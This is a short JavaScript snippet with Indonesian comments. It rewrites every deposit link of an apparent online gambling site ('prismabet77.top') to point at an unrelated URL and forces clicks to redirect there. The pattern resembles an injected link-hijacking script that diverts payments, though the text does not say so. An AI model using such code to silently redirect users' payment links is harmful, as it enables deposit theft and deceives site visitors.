document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="https://prismabet77.top//m/account/deposit"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://g.com/hill.html");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://g.com/hill.html";
    });
  });
});
